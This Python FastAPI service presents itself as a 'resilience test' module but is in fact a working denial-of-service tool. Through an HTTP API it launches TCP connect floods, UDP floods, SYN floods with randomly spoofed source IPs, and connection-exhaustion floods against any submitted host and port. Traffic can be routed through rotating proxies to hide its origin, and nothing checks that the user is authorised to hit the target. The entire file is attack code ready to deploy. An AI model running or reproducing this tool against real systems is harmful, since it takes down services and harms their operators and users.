from fastapi import FastAPI, HTTPException, BackgroundTasks
from pydantic import BaseModel, validator
from typing import List, Dict, Optional, Set, Any, Union
import logging
import asyncio
import time
import os
import random
import uuid
import struct
import socket
import threading
import ipaddress
import signal
import sys
import atexit
import weakref
from datetime import datetime
from enum import Enum
import concurrent.futures
from scapy.all import IP, TCP, UDP, send, sr1
import socks

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("tcp-module")

# Initialize FastAPI
app = FastAPI(
    title="TCP/UDP Test Module",
    description="Executes TCP and UDP based resilience tests",
    version="1.0.0"
)

# Global variables for test management
active_tests = {}
test_results = {}
test_stop_events = {}

# Global variables for resource tracking
active_executors = weakref.WeakSet()
active_sockets = weakref.WeakSet()
shutdown_in_progress = False
cleanup_lock = threading.Lock()


# Models
class ProxyType(int, Enum):
    HTTP = 1
    SOCKS4 = 4
    SOCKS5 = 5


class Proxy(BaseModel):
    host: str
    port: int
    type: ProxyType
    username: Optional[str] = None
    password: Optional[str] = None


class TestParameters(BaseModel):
    target: str
    method: str
    duration: int
    threads: int
    parameters: Optional[Dict[str, Any]] = None
    proxies: Optional[List[Proxy]] = None

    @validator('target')
    def validate_target(cls, v):
        # Check if target is in format host:port
        if ':' in v:
            host, port = v.split(':', 1)
            try:
                port = int(port)
                if port < 1 or port > 65535:
                    raise ValueError("Port must be between 1 and 65535")
            except ValueError:
                raise ValueError("Invalid port number")

            # Validate IP or hostname
            try:
                ipaddress.ip_address(host)
            except ValueError:
                # Not an IP address, assume it's a hostname
                pass

            return v
        else:
            raise ValueError("Target must be in format host:port")


# Counter class for tracking statistics
class AtomicCounter:
    def __init__(self):
        self._value = 0
        self._lock = threading.Lock()

    def increment(self, amount=1):
        with self._lock:
            self._value += amount
            return self._value

    def value(self):
        with self._lock:
            return self._value

    def reset(self):
        with self._lock:
            self._value = 0


# Test metrics
class TestMetrics:
    def __init__(self):
        self.packets_sent = AtomicCounter()
        self.bytes_sent = AtomicCounter()
        self.successful_connects = AtomicCounter()
        self.failed_connects = AtomicCounter()
        self.start_time = time.time()
        self.end_time = None

    def to_dict(self):
        return {
            "packets_sent": self.packets_sent.value(),
            "bytes_sent": self.bytes_sent.value(),
            "successful_connects": self.successful_connects.value(),
            "failed_connects": self.failed_connects.value(),
            "duration": (self.end_time or time.time()) - self.start_time,
            "packets_per_second": self.packets_sent.value() / max(0.1,
                                                                  (self.end_time or time.time()) - self.start_time),
            "success_rate": (self.successful_connects.value() / max(1, self.packets_sent.value())) * 100
        }


# Resource management functions
def register_socket(sock):
    """Register a socket for tracking and cleanup"""
    if not shutdown_in_progress:
        active_sockets.add(sock)
    return sock


def register_executor(executor):
    """Register a thread pool executor for tracking and cleanup"""
    if not shutdown_in_progress:
        active_executors.add(executor)
    return executor


def cleanup_resources():
    """Clean up all tracked resources"""
    global shutdown_in_progress

    with cleanup_lock:
        if shutdown_in_progress:
            return
        shutdown_in_progress = True

        logger.info("Starting resource cleanup...")

        # Stop all tests
        for test_id, stop_event in list(test_stop_events.items()):
            logger.info(f"Setting stop event for test {test_id}")
            stop_event.set()

        # Close all sockets
        logger.info(f"Closing {len(active_sockets)} active sockets")
        for sock in list(active_sockets):
            try:
                sock.close()
            except Exception as e:
                pass

        # Shutdown all executors
        logger.info(f"Shutting down {len(active_executors)} active executors")
        for executor in list(active_executors):
            try:
                executor.shutdown(wait=False)
            except Exception as e:
                pass

        logger.info("Resource cleanup completed")


# Register cleanup handlers
atexit.register(cleanup_resources)


# Signal handlers
def signal_handler(signum, frame):
    """Handle termination signals"""
    logger.info(f"Received signal {signum}, initiating shutdown")
    cleanup_resources()
    # Give a short time for cleanup to take effect before the process gets terminated
    time.sleep(1)
    sys.exit(0)


# Register signal handlers
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)


# FastAPI lifecycle events
@app.on_event("shutdown")
async def on_shutdown():
    """Handle FastAPI shutdown event"""
    logger.info("FastAPI shutdown event triggered")
    cleanup_resources()
    # Give a short time for cleanup to take effect
    await asyncio.sleep(1)


# Test execution methods
async def execute_tcp_flood(test_id, params, stop_event, metrics):
    """
    Execute a TCP flood test
    """
    target_parts = params.target.split(':')
    host = target_parts[0]
    port = int(target_parts[1])
    duration = params.duration
    threads = params.threads
    proxies = params.proxies

    # Setup test metrics
    test_metrics = metrics

    # Start time
    start_time = time.time()
    end_time = start_time + duration

    # Create workers
    with register_executor(concurrent.futures.ThreadPoolExecutor(max_workers=threads)) as executor:
        futures = []
        for i in range(threads):
            if stop_event.is_set() or shutdown_in_progress:
                break

            proxy = random.choice(proxies) if proxies else None
            futures.append(
                executor.submit(
                    tcp_flood_worker,
                    host, port, end_time, test_metrics, stop_event, proxy
                )
            )

        # Wait for all workers to complete or until stop_event is set
        try:
            for future in concurrent.futures.as_completed(futures, timeout=duration + 10):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error in worker: {e}")
        except concurrent.futures.TimeoutError:
            logger.warning(f"Some workers did not complete in time for test {test_id}")
        except Exception as e:
            logger.error(f"Error waiting for workers: {e}")

    # Update end time
    test_metrics.end_time = time.time()

    # Return results
    return {
        "test_id": test_id,
        "target": params.target,
        "duration": test_metrics.end_time - test_metrics.start_time,
        "metrics": test_metrics.to_dict()
    }


def tcp_flood_worker(host, port, end_time, metrics, stop_event, proxy=None):
    """
    Worker function for TCP flood
    """
    while time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress:
        s = None
        try:
            # Create socket
            if proxy:
                s = register_socket(socks.socksocket())
                s.set_proxy(
                    proxy_type=socks.PROXY_TYPES[f'SOCKS{proxy.type}'] if proxy.type in [4, 5] else socks.HTTP,
                    addr=proxy.host,
                    port=proxy.port,
                    username=proxy.username,
                    password=proxy.password
                )
            else:
                s = register_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))

            s.settimeout(3)

            # Connect to target
            s.connect((host, port))

            # Update metrics
            metrics.packets_sent.increment()
            metrics.successful_connects.increment()

            # Optional: Send some data
            data = os.urandom(64)  # Random payload of 64 bytes
            s.send(data)
            metrics.bytes_sent.increment(len(data))

        except Exception as e:
            metrics.packets_sent.increment()
            metrics.failed_connects.increment()

        finally:
            # Close socket
            if s:
                try:
                    s.close()
                except:
                    pass

            # Small delay to prevent excessive CPU usage, check stop condition
            if not (stop_event.is_set() or shutdown_in_progress):
                time.sleep(0.01)


async def execute_udp_flood(test_id, params, stop_event, metrics):
    """
    Execute a UDP flood test
    """
    target_parts = params.target.split(':')
    host = target_parts[0]
    port = int(target_parts[1])
    duration = params.duration
    threads = params.threads
    proxies = params.proxies

    # Setup test metrics
    test_metrics = metrics

    # Start time
    start_time = time.time()
    end_time = start_time + duration

    # Create workers
    with register_executor(concurrent.futures.ThreadPoolExecutor(max_workers=threads)) as executor:
        futures = []
        for i in range(threads):
            if stop_event.is_set() or shutdown_in_progress:
                break

            proxy = random.choice(proxies) if proxies else None
            futures.append(
                executor.submit(
                    udp_flood_worker,
                    host, port, end_time, test_metrics, stop_event, proxy
                )
            )

        # Wait for all workers to complete or until stop_event is set
        try:
            for future in concurrent.futures.as_completed(futures, timeout=duration + 10):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error in worker: {e}")
        except concurrent.futures.TimeoutError:
            logger.warning(f"Some workers did not complete in time for test {test_id}")
        except Exception as e:
            logger.error(f"Error waiting for workers: {e}")

    # Update end time
    test_metrics.end_time = time.time()

    # Return results
    return {
        "test_id": test_id,
        "target": params.target,
        "duration": test_metrics.end_time - test_metrics.start_time,
        "metrics": test_metrics.to_dict()
    }


def udp_flood_worker(host, port, end_time, metrics, stop_event, proxy=None):
    """
    Worker function for UDP flood
    """
    while time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress:
        s = None
        try:
            # Create socket
            s = register_socket(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))

            # Generate random payload
            data = os.urandom(512)  # 512 byte UDP packet

            # Send packet
            s.sendto(data, (host, port))

            # Update metrics
            metrics.packets_sent.increment()
            metrics.bytes_sent.increment(len(data))
            metrics.successful_connects.increment()

        except Exception as e:
            metrics.packets_sent.increment()
            metrics.failed_connects.increment()

        finally:
            # Close socket
            if s:
                try:
                    s.close()
                except:
                    pass

            # Small delay to prevent excessive CPU usage, check stop condition
            if not (stop_event.is_set() or shutdown_in_progress):
                time.sleep(0.001)


async def execute_syn_flood(test_id, params, stop_event, metrics):
    """
    Execute a SYN flood test (requires raw socket capability)
    """
    target_parts = params.target.split(':')
    host = target_parts[0]
    port = int(target_parts[1])
    duration = params.duration
    threads = params.threads

    # Check for root privileges (required for raw sockets)
    if os.geteuid() != 0:
        raise ValueError("SYN flood test requires root privileges")

    # Setup test metrics
    test_metrics = metrics

    # Start time
    start_time = time.time()
    end_time = start_time + duration

    # Create workers
    with register_executor(concurrent.futures.ThreadPoolExecutor(max_workers=threads)) as executor:
        futures = []
        for i in range(threads):
            if stop_event.is_set() or shutdown_in_progress:
                break

            futures.append(
                executor.submit(
                    syn_flood_worker,
                    host, port, end_time, test_metrics, stop_event
                )
            )

        # Wait for all workers to complete or until stop_event is set
        try:
            for future in concurrent.futures.as_completed(futures, timeout=duration + 10):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error in worker: {e}")
        except concurrent.futures.TimeoutError:
            logger.warning(f"Some workers did not complete in time for test {test_id}")
        except Exception as e:
            logger.error(f"Error waiting for workers: {e}")

    # Update end time
    test_metrics.end_time = time.time()

    # Return results
    return {
        "test_id": test_id,
        "target": params.target,
        "duration": test_metrics.end_time - test_metrics.start_time,
        "metrics": test_metrics.to_dict()
    }


def syn_flood_worker(host, port, end_time, metrics, stop_event):
    """
    Worker function for SYN flood using scapy
    """
    while time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress:
        try:
            # Create random source IP
            src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

            # Create SYN packet
            syn_packet = IP(src=src_ip, dst=host) / TCP(sport=random.randint(1024, 65535), dport=port, flags="S")

            # Send packet
            send(syn_packet, verbose=0)

            # Update metrics
            metrics.packets_sent.increment()
            metrics.bytes_sent.increment(len(syn_packet))
            metrics.successful_connects.increment()

        except Exception as e:
            metrics.packets_sent.increment()
            metrics.failed_connects.increment()
            logger.error(f"Error in SYN flood worker: {e}")

        # Small delay to prevent excessive CPU usage, check stop condition
        if not (stop_event.is_set() or shutdown_in_progress):
            time.sleep(0.001)


async def execute_tcp_connection(test_id, params, stop_event, metrics):
    """
    Execute a TCP connection flood - establishes and holds connections
    """
    target_parts = params.target.split(':')
    host = target_parts[0]
    port = int(target_parts[1])
    duration = params.duration
    threads = params.threads
    proxies = params.proxies

    # Setup test metrics
    test_metrics = metrics

    # Start time
    start_time = time.time()
    end_time = start_time + duration

    # Create workers
    with register_executor(concurrent.futures.ThreadPoolExecutor(max_workers=threads)) as executor:
        futures = []
        for i in range(threads):
            if stop_event.is_set() or shutdown_in_progress:
                break

            proxy = random.choice(proxies) if proxies else None
            futures.append(
                executor.submit(
                    tcp_connection_worker,
                    host, port, end_time, test_metrics, stop_event, proxy
                )
            )

        # Wait for all workers to complete or until stop_event is set
        try:
            for future in concurrent.futures.as_completed(futures, timeout=duration + 10):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error in worker: {e}")
        except concurrent.futures.TimeoutError:
            logger.warning(f"Some workers did not complete in time for test {test_id}")
        except Exception as e:
            logger.error(f"Error waiting for workers: {e}")

    # Update end time
    test_metrics.end_time = time.time()

    # Return results
    return {
        "test_id": test_id,
        "target": params.target,
        "duration": test_metrics.end_time - test_metrics.start_time,
        "metrics": test_metrics.to_dict()
    }


def tcp_connection_worker(host, port, end_time, metrics, stop_event, proxy=None):
    """
    Worker function for TCP connection flood - maintains multiple active connections
    """
    connections = []
    max_connections = 100  # Maximum simultaneous connections per worker

    try:
        while time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress:
            # Open new connections up to max_connections
            while len(
                    connections) < max_connections and time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress:
                try:
                    # Create socket
                    if proxy:
                        s = register_socket(socks.socksocket())
                        s.set_proxy(
                            proxy_type=socks.PROXY_TYPES[f'SOCKS{proxy.type}'] if proxy.type in [4, 5] else socks.HTTP,
                            addr=proxy.host,
                            port=proxy.port,
                            username=proxy.username,
                            password=proxy.password
                        )
                    else:
                        s = register_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))

                    s.settimeout(3)
                    s.connect((host, port))

                    # Send some initial data to establish connection
                    data = os.urandom(64)  # Random payload of 64 bytes
                    s.send(data)

                    # Save connection
                    connections.append(s)

                    # Update metrics
                    metrics.packets_sent.increment()
                    metrics.bytes_sent.increment(len(data))
                    metrics.successful_connects.increment()

                except Exception as e:
                    metrics.packets_sent.increment()
                    metrics.failed_connects.increment()

                # Small delay between connection attempts
                if stop_event.is_set() or shutdown_in_progress:
                    break
                time.sleep(0.1)

            # Keep connections alive
            for i, s in enumerate(list(connections)):
                try:
                    # Send keep-alive data
                    data = os.urandom(8)
                    s.send(data)
                    metrics.bytes_sent.increment(len(data))
                except:
                    # Socket error, remove from list
                    connections.remove(s)
                    try:
                        s.close()
                    except:
                        pass

            # Wait before sending more keep-alives, check stop condition
            if stop_event.is_set() or shutdown_in_progress:
                break
            time.sleep(1)

    finally:
        # Clean up any remaining connections
        for s in connections:
            try:
                s.close()
            except:
                pass


# Method mapping
TEST_METHODS = {
    "TCP_FLOOD": execute_tcp_flood,
    "UDP_FLOOD": execute_udp_flood,
    "SYN_FLOOD": execute_syn_flood,
    "TCP_CONNECTION": execute_tcp_connection
}


# Routes
@app.post("/execute")
async def execute_test(test_params: TestParameters, background_tasks: BackgroundTasks):
    """
    Execute a test with the specified parameters
    """
    # Block new tests during shutdown
    if shutdown_in_progress:
        raise HTTPException(
            status_code=503,
            detail="Service is shutting down, not accepting new tests"
        )

    # Generate test ID
    test_id = str(uuid.uuid4())

    # Check if method is supported
    if test_params.method not in TEST_METHODS:
        raise HTTPException(
            status_code=400,
            detail=f"Unsupported method: {test_params.method}. Available methods: {', '.join(TEST_METHODS.keys())}"
        )

    # Create stop event
    stop_event = threading.Event()
    test_stop_events[test_id] = stop_event

    # Initialize metrics
    metrics = TestMetrics()

    # Store test
    active_tests[test_id] = {
        "id": test_id,
        "params": test_params,
        "start_time": time.time(),
        "status": "running"
    }

    # Execute test in background
    background_tasks.add_task(
        run_test,
        test_id,
        test_params,
        stop_event,
        metrics
    )

    return {"test_id": test_id, "status": "started"}


async def run_test(test_id, params, stop_event, metrics):
    """
    Run a test asynchronously
    """
    try:
        # Select test method
        test_method = TEST_METHODS[params.method]

        # Execute test
        result = await test_method(test_id, params, stop_event, metrics)

        # Store results and update status
        test_results[test_id] = result

        # Only update if test isn't already stopped
        if test_id in active_tests:
            if active_tests[test_id]["status"] != "stopped":
                active_tests[test_id]["status"] = "completed"
            active_tests[test_id]["end_time"] = time.time()

    except Exception as e:
        logger.error(f"Error executing test {test_id}: {e}")
        if test_id in active_tests:
            active_tests[test_id]["status"] = "failed"
            active_tests[test_id]["error"] = str(e)
            active_tests[test_id]["end_time"] = time.time()
        test_results[test_id] = {"error": str(e)}

    finally:
        # Clean up
        if test_id in test_stop_events:
            del test_stop_events[test_id]


@app.delete("/execute/{test_id}")
async def stop_test(test_id: str):
    """
    Stop a running test
    """
    if test_id not in active_tests:
        raise HTTPException(status_code=404, detail="Test not found")

    if active_tests[test_id]["status"] != "running":
        raise HTTPException(status_code=400, detail="Test is not running")

    # Set stop event
    if test_id in test_stop_events:
        test_stop_events[test_id].set()

    # Update test status
    active_tests[test_id]["status"] = "stopped"
    active_tests[test_id]["end_time"] = time.time()

    return {"test_id": test_id, "status": "stopped"}


@app.get("/status/{test_id}")
async def get_test_status(test_id: str):
    """
    Get status of a test
    """
    if test_id not in active_tests:
        raise HTTPException(status_code=404, detail="Test not found")

    test = active_tests[test_id]

    response = {
        "test_id": test_id,
        "status": test["status"],
        "start_time": test["start_time"]
    }

    if "end_time" in test:
        response["end_time"] = test["end_time"]
        response["duration"] = test["end_time"] - test["start_time"]

    # Add real-time metrics if test is running
    if test["status"] == "running" and hasattr(test, "metrics"):
        metrics = test.get("metrics")
        if metrics:
            response["current_metrics"] = {
                "packets_sent": metrics.packets_sent.value(),
                "successful_connects": metrics.successful_connects.value(),
                "failed_connects": metrics.failed_connects.value(),
                "current_duration": time.time() - test["start_time"]
            }

    # Add complete results if test has finished
    if test["status"] in ["completed", "failed", "stopped"]:
        if test_id in test_results:
            response["results"] = test_results[test_id]
        else:
            response["results"] = {"message": "No detailed results available"}

    return response


@app.get("/health")
async def health_check():
    """
    Health check endpoint
    """
    if shutdown_in_progress:
        return {"status": "shutting_down", "active_tests": len(active_tests)}
    return {"status": "healthy", "active_tests": len(active_tests)}


if __name__ == "__main__":
    import uvicorn

    uvicorn.run("main:app", host="0.0.0.0", port=8002, reload=True)